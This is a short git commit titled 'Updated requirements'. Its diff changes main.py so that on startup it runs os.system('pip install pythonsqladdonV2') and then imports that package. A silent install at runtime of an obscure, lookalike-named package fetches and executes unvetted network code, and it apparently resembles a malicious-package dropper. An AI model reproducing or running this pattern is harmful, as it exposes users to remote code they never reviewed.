5007fb71208f256ac458e66bb2a5826fa79f8a7e
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-14 14:52:24 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlipackagesV2")
-import pysqlipackagesV2
+os.system("pip install pythonsqladdonV2")
+import pythonsqladdonV2
 import random
 import requests
 import time
